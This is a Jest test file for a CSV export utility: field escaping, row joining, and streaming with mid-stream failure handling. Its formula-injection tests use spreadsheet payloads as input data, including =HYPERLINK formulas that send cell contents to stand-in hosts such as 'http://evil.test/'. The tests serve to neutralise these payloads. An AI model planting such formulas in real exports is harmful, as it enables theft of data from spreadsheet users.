import { csvEscapeField, csvRow, streamCsv } from "./csv.util";

describe("csvEscapeField", () => {
  it("passes a plain value through unchanged", () => {
    expect(csvEscapeField("hello")).toBe("hello");
    expect(csvEscapeField(42)).toBe("42");
  });

  it("returns an empty string for null/undefined", () => {
    expect(csvEscapeField(null)).toBe("");
    expect(csvEscapeField(undefined)).toBe("");
  });

  it("quotes and doubles embedded quotes for a value containing a comma", () => {
    expect(csvEscapeField("a,b")).toBe('"a,b"');
  });

  it("quotes and doubles embedded quotes for a value containing a double quote", () => {
    expect(csvEscapeField('say "hi"')).toBe('"say ""hi"""');
  });

  it("quotes a value containing a newline", () => {
    expect(csvEscapeField("line1\nline2")).toBe('"line1\nline2"');
  });

  it("quotes a value containing a carriage return", () => {
    expect(csvEscapeField("line1\r\nline2")).toBe('"line1\r\nline2"');
  });

  it("handles a field containing comma, quote, AND a newline together (the brief's exact test case)", () => {
    const input = 'Şikayet: "gecikti", çok\nkötüydü';
    const escaped = csvEscapeField(input);
    expect(escaped).toBe('"Şikayet: ""gecikti"", çok\nkötüydü"');
    // Round-trip sanity: exactly one pair of wrapping quotes, every
    // internal quote doubled.
    expect(escaped.startsWith('"')).toBe(true);
    expect(escaped.endsWith('"')).toBe(true);
  });

  describe("[Fix round, Important 6] formula-injection defense", () => {
    it.each([
      [
        '=HYPERLINK("http://evil/"&A1,"Click")',
        '\'=HYPERLINK("http://evil/"&A1,"Click")',
      ],
      ["+1+1", "'+1+1"],
      ["-1+1", "'-1+1"],
      ["@SUM(1,1)", "'@SUM(1,1)"],
      ["\tsneaky", "'\tsneaky"],
      ["\rsneaky", "'\rsneaky"],
    ])(
      "prefixes a leading formula-trigger character %p with a single quote",
      (input, expectedPrefixed) => {
        // The =HYPERLINK example also contains commas/quotes, so the
        // FINAL output is additionally RFC-4180-wrapped — assert the
        // prefix landed by checking the wrapped/unwrapped value contains
        // the single-quote-prefixed string, not exact equality for that
        // one case.
        const escaped = csvEscapeField(input);
        if (/[",\r\n]/.test(expectedPrefixed)) {
          expect(escaped).toContain("'");
          expect(escaped.replace(/^"|"$/g, "").replace(/""/g, '"')).toBe(
            expectedPrefixed,
          );
        } else {
          expect(escaped).toBe(expectedPrefixed);
        }
      },
    );

    it("a legalName like =HYPERLINK(...) round-trips as inert literal text, never a live formula", () => {
      const merchantLegalName = '=HYPERLINK("http://evil.test/"&A1,"Click me")';
      const escaped = csvEscapeField(merchantLegalName);
      // Must start with a quoted apostrophe-prefixed value — Excel/Sheets
      // render a leading `'` as "this cell is text", never evaluating
      // whatever follows as a formula.
      expect(escaped.startsWith("\"'")).toBe(true);
    });

    it("does NOT touch a value that merely CONTAINS = / + / - / @ later in the string", () => {
      expect(csvEscapeField("total=5")).toBe("total=5");
      expect(csvEscapeField("a+b")).toBe("a+b");
      expect(csvEscapeField("user@example.com")).toBe("user@example.com");
    });

    it("a negative NUMBER is still prefixed — deliberately unconditional, see csv.util.ts's doc comment (OWASP's own guidance; moot here since no export field is ever negative)", () => {
      expect(csvEscapeField(-500)).toBe("'-500");
    });
  });
});

describe("csvRow", () => {
  it("joins escaped fields with commas and ends with CRLF", () => {
    expect(csvRow(["a", "b,c", 3])).toBe('a,"b,c",3\r\n');
  });
});

describe("streamCsv", () => {
  function fakeResponse() {
    const chunks: string[] = [];
    return {
      chunks,
      setHeader: jest.fn(),
      write: jest.fn((chunk: string) => {
        chunks.push(chunk);
        return true;
      }),
      end: jest.fn(),
      destroy: jest.fn(),
    };
  }

  it("writes the header, pages through fetchPage, and ends the response", async () => {
    const res = fakeResponse();
    const pages = [[{ id: 1 }, { id: 2 }], [{ id: 3 }]];
    const fetchPage = jest.fn((skip: number, take: number) => {
      expect(take).toBe(2);
      return Promise.resolve(pages[skip / 2] ?? []);
    });

    await streamCsv(
      res as any,
      "export.csv",
      ["id"],
      fetchPage,
      (item: { id: number }) => [item.id],
      2,
    );

    expect(res.setHeader).toHaveBeenCalledWith(
      "Content-Type",
      "text/csv; charset=utf-8",
    );
    expect(res.setHeader).toHaveBeenCalledWith(
      "Content-Disposition",
      'attachment; filename="export.csv"',
    );
    expect(res.chunks.join("")).toBe("id\r\n1\r\n2\r\n3\r\n");
    expect(res.end).toHaveBeenCalledTimes(1);
    // Two pages fetched (2 rows, then 1 row < pageSize -> stop); never a
    // third fetch.
    expect(fetchPage).toHaveBeenCalledTimes(2);
  });

  it("never buffers the whole result set — each page is written to the response as it arrives, before the next page is fetched", async () => {
    const res = fakeResponse();
    const writeOrder: string[] = [];
    let secondFetchStarted = false;

    // pageSize=1: the first page returns EXACTLY 1 row (== pageSize), so
    // streamCsv cannot yet tell it's the last page and must fetch a
    // second (empty) page to confirm — that second fetch is the probe
    // this test uses to prove the first page's row was already written
    // to the response before it happens.
    const fetchPage = jest.fn(async (skip: number) => {
      if (skip === 0) {
        writeOrder.push("fetch-page-1");
        return [{ id: 1 }];
      }
      secondFetchStarted = true;
      writeOrder.push("fetch-page-2");
      return [];
    });

    const originalWrite = res.write;
    res.write = jest.fn((chunk: string) => {
      writeOrder.push(`write:${chunk.trim()}`);
      return originalWrite(chunk);
    }) as any;

    await streamCsv(
      res as any,
      "x.csv",
      ["id"],
      fetchPage,
      (item: { id: number }) => [item.id],
      1,
    );

    // The first page's row is written BEFORE the second (empty) page is
    // ever fetched — proves streaming, not "fetch everything then write".
    const firstRowWriteIndex = writeOrder.indexOf("write:1");
    const secondFetchIndex = writeOrder.indexOf("fetch-page-2");
    expect(firstRowWriteIndex).toBeGreaterThan(-1);
    expect(secondFetchIndex).toBeGreaterThan(firstRowWriteIndex);
    expect(secondFetchStarted).toBe(true);
  });

  it("handles an empty result set — header only, one fetch, clean end", async () => {
    const res = fakeResponse();
    const fetchPage = jest.fn().mockResolvedValue([]);

    await streamCsv(res as any, "empty.csv", ["id"], fetchPage, (item: any) => [
      item.id,
    ]);

    expect(res.chunks.join("")).toBe("id\r\n");
    expect(fetchPage).toHaveBeenCalledTimes(1);
    expect(res.end).toHaveBeenCalledTimes(1);
  });

  describe("[Fix round, Minor] mid-stream fetchPage failure", () => {
    it("destroys the connection instead of silently ending it when a LATER page's fetch throws", async () => {
      const res = fakeResponse();
      const dbError = new Error("connection terminated unexpectedly");
      const fetchPage = jest
        .fn()
        // First page: header is already flushed by the time this
        // resolves, and this page's own rows get written too — proving
        // the failure genuinely happens AFTER real data already went out
        // (a truncation, not an empty response).
        .mockResolvedValueOnce([{ id: 1 }, { id: 2 }])
        .mockRejectedValueOnce(dbError);

      await streamCsv(
        res as any,
        "export.csv",
        ["id"],
        fetchPage,
        (item: { id: number }) => [item.id],
        2,
      );

      // The header and first page's rows genuinely reached the client
      // before the failure — this is exactly the "looks complete so far"
      // trap the fix defends against.
      expect(res.chunks.join("")).toBe("id\r\n1\r\n2\r\n");

      // The connection is forcibly reset, carrying the real error...
      expect(res.destroy).toHaveBeenCalledTimes(1);
      expect(res.destroy).toHaveBeenCalledWith(dbError);

      // ...and NOT cleanly ended — a clean res.end() is exactly what
      // would make a truncated body indistinguishable from a complete
      // one to a client that isn't strictly checking the chunked
      // trailer.
      expect(res.end).not.toHaveBeenCalled();
    });

    it("resolves rather than rejecting — a mid-stream failure must not become an unhandled promise rejection at the controller's `await streamCsv(...)` call site", async () => {
      const res = fakeResponse();
      const fetchPage = jest
        .fn()
        .mockResolvedValueOnce([{ id: 1 }])
        .mockRejectedValueOnce(new Error("boom"));

      await expect(
        streamCsv(
          res as any,
          "x.csv",
          ["id"],
          fetchPage,
          (item: any) => [item.id],
          1,
        ),
      ).resolves.toBeUndefined();
    });

    it("wraps a non-Error rejection (e.g. a thrown string) in an Error before destroying the connection", async () => {
      const res = fakeResponse();
      const fetchPage = jest
        .fn()
        .mockRejectedValueOnce("plain string rejection");

      await streamCsv(res as any, "x.csv", ["id"], fetchPage, (item: any) => [
        item.id,
      ]);

      expect(res.destroy).toHaveBeenCalledTimes(1);
      const passedArg = res.destroy.mock.calls[0][0];
      expect(passedArg).toBeInstanceOf(Error);
      expect(passedArg.message).toBe("plain string rejection");
    });
  });
});
